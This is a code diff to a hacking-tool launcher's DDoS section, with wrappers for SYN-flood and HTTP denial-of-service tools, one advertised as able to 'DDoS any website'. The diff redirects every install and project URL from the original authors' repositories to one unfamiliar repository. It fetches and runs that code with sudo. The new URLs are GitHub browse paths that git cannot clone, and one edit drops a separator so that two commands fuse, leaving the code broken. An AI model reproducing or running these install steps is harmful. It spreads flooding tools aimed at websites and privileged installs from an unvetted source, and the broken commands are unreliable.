@@ -15,10 +15,10 @@ class ddos(HackingTool):
     )
 
     INSTALL_COMMANDS = [
-        "git clone https://github.com/the-deepnet/ddos.git",
+        "git clone https://github.com/Flutter13264-r/PULSE/tree/main/tools/ddos.git",
         "cd ddos;sudo pip3 install -r requirements.txt",
     ]
-    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"
+    PROJECT_URL = "https://github.com/Flutter13264-r/PULSE/tree/main/tools/ddos.git"
 
     def run(self):
         method = input("Enter Method >> ")
@@ -64,10 +64,10 @@ class Asyncrone(HackingTool):
         "SYN packet intensively to the destination."
     )
     INSTALL_COMMANDS = [
-        "git clone https://github.com/fatih4842/aSYNcrone.git",
+        "git clone https://github.com/Flutter13264-r/PULSE/tree/main/tools/aSYNcrone.git",
         "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread",
     ]
-    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"
+    PROJECT_URL = "https://github.com/Flutter13264-r/PULSE/tree/main/tools/aSYNcrone"
 
     def run(self):
         source_port = input("Enter Source Port >> ")
@@ -88,11 +88,11 @@ class UFONet(HackingTool):
         "More Usage Visit"
     )
     INSTALL_COMMANDS = [
-        "sudo git clone https://github.com/epsylon/ufonet.git",
+        "sudo git clone https://github.com/Flutter13264-r/PULSE/tree/main/tools/ufonet.git",
         "cd ufonet;sudo python3 setup.py install;sudo pip3 install GeoIP;sudo pip3 install python-geoip;sudo pip3 install pygeoip;sudo pip3 install requests;sudo pip3 install pycrypto;sudo pip3 install pycurl;sudo pip3 install whois;sudo pip3 install scapy-python3",
     ]
     RUN_COMMANDS = ["sudo python3 ufonet --gui"]
-    PROJECT_URL = "https://github.com/epsylon/ufonet"
+    PROJECT_URL = "https://github.com/Flutter13264-r/PULSE/tree/main/tools/ufonet"
 
 
 class GoldenEye(HackingTool):
@@ -102,10 +102,10 @@ class GoldenEye(HackingTool):
         "GoldenEye is a HTTP DoS Test Tool."
     )
     INSTALL_COMMANDS = [
-        "sudo git clone https://github.com/jseidl/GoldenEye.git;"
+        "sudo git clone https://github.com/Flutter13264-r/PULSE/tree/main/tools/GoldenEye.git"
         "chmod -R 755 GoldenEye"
     ]
-    PROJECT_URL = "https://github.com/jseidl/GoldenEye"
+    PROJECT_URL = "https://github.com/Flutter13264-r/PULSE/tree/main/tools/GoldenEye"
 
     def run(self):
         os.system("cd GoldenEye ;sudo ./goldeneye.py")
@@ -117,12 +117,12 @@ class Saphyra(HackingTool):
     DESCRIPTION = "A complex python code to DDoS any website with a very easy usage.!\n"
     INSTALL_COMMANDS = [
         "sudo su",
-        "git clone https://github.com/anonymous24x7/Saphyra-DDoS.git",
+        "git clone https://github.com/Flutter13264-r/PULSE/tree/main/tools/saphyra.git",
         "cd Saphyra-DDoS",
         "chmod +x saphyra.py",
         "python saphyra.py",
     ]
-    PROJECT_URL = "https://github.com/anonymous24x7/Saphyra-DDoS"
+    PROJECT_URL = "https://github.com/Flutter13264-r/PULSE/tree/main/tools/saphyra"
 
     def run(self):
         url = input("Enter url>>> ")
